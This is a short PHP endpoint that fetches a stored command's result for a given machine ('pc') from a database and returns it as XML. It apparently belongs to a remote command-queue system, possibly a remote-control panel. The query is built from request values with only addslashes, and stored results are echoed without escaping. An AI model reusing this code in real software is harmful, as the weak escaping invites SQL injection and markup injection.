<?php 
# Return result of a command. 
header('Content-Type: text/xml');
include("conn.php");
$xml="";
echo "<statuses>";
if(isset($_GET['pc'])) {
	$pc=addslashes(html_entity_decode($_GET['pc'])); 
	$cmd=addslashes(html_entity_decode($_GET['cmd']));
	$n = strlen($cmd);
	$test = mysqli_query($bdd, "SELECT id, result FROM commands WHERE pc='$pc' AND SUBSTRING(cmd,1,$n) = '$cmd' AND ok='1' LIMIT 1");	
	while($tabl=mysqli_fetch_array($test)){   
		$resultOfcmd = $tabl['result'];	
				
	if(empty($resultOfcmd)){
		}
	else {  
		$xml .= '<status>';
		$xml .= '<result>'.$tabl['result'].'</result>';
		$xml .= '<id>'.$tabl['id'].'</id>';
		$xml .= '</status>';	
		}
	}
	echo $xml;
	mysqli_close($bdd); 
	#$bdd->close();
	echo "</statuses>";	
}

?>